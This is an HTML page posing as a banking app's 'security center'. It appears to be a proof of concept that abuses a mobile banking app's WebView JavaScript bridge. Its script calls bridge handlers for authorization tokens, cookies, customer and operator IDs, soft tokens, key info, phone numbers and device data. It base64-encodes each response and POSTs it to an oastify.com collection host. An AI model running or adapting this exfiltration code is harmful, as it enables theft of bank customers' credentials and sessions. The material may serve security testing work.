<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>企业掌银安全中心</title>
<style>
 body{font-family:monospace;font-size:13px;background:#fff;margin:8px}
 #log{white-space:pre-wrap;word-break:break-all;border:1px solid #ccc;padding:6px;min-height:160px;margin-bottom:10px}
 button{display:inline-block;width:48%;margin:1%;padding:14px 0;font-size:13px;background:#3aa77a;color:#fff;border:0;border-radius:6px}
 button.warn{background:#c07830}
</style></head><body>
<div id="log">[boot]</div>
<div id="btns"></div>
<script>
var L = document.getElementById('log');
var OAST = "https://fsbm03ajeb3d1cvmsxsopyv54wanyem3.oastify.com/";
var T0 = Date.now();
function ts(){ return ((Date.now()-T0)/1000).toFixed(1)+'s'; }
function v(msg){ L.textContent += '\n['+ts()+'] '+msg; L.scrollTop = L.scrollHeight; }
function beacon(path){ try{ (new Image()).src = path; }catch(e){} }
function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
window.onerror = function(m,s,l){ v('ONERROR: '+m+' @'+l); beacon(OAST+'?evt=jserror'); };
v('typeof UMJSBridge = '+typeof window.UMJSBridge);
beacon(OAST+'?evt=loaded&bridge='+(typeof window.UMJSBridge));

var EVTS = [
 ["get_loginStatus", {}, 0],
 ["getCombLoginInfo", {}, 0],
 ["getCombInfo", {}, 0],
 ["get_deviceInfo", {}, 0],
 ["getClipboardInfo", {}, 0],
 ["abcGetInfo", {}, 0],
 ["app_checkversion", {}, 0],
 ["finger_check_support", {}, 0],
 ["check_combpush_login", {}, 0],
 ["getAppInstallStatus", {}, 0],
 ["get_headerHeight", {}, 0],
 ["get_safeAreaHeight", {}, 0],
 ["get_gmssl_switch", {}, 0],
 ["loginInfo_cache_get", {appId:"30000043",keys:""}, 0],
 ["cache_get", {keys:"Authorization|COMB_APP_CACHE_customerId|COMB_APP_CACHE_operatorId|combSsId|UserLevel|login_app_id|login_app_url|COMB_APP_CACHE_location_info"}, 0],
 ["db_getData loginStatus", {key:"loginStatus"}, 0],
 ["db_getData Cookie", {key:"Cookie"}, 0],
 ["db_getData combLoginCustomerType", {key:"combLoginCustomerType"}, 0],
 ["tdr_soft_token", {}, 1],
 ["key_info", {}, 1],
 ["phone_number_pass", {}, 1],
 ["get_cookie", {}, 1],
 ["get_all_deviceInfo", {}, 1]
];
function exfil(h, resp){
  var data = {ts:Date.now(), url:location.href, evt:h, resp:resp};
  beacon(OAST+'?evt='+encodeURIComponent(h)+'&len='+JSON.stringify(resp).length);
  try{
    fetch(OAST, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body: b64(JSON.stringify(data))});
  }catch(e){}
}
function run(h, params){
  v('>> call '+h+' '+JSON.stringify(params));
  try{
    UMJSBridge.callHandler(h, params, function(resp){
      v('<< '+h+' => '+JSON.stringify(resp).slice(0,400));
      exfil(h, resp);
    });
  }catch(e){ v('!! '+h+' THROW: '+e.message); exfil(h, 'THROW:'+e.message); }
}
var G = document.getElementById('btns');
for (var i=0;i<EVTS.length;i++){
  (function(e){
    var b = document.createElement('button');
    b.textContent = e[0];
    if (e[2]) b.className = 'warn';
    b.onclick = function(){ run(e[0].split(' ')[0], e[1]); };
    G.appendChild(b);
  })(EVTS[i]);
}
v('buttons rendered: '+EVTS.length);
</script>
</body></html>
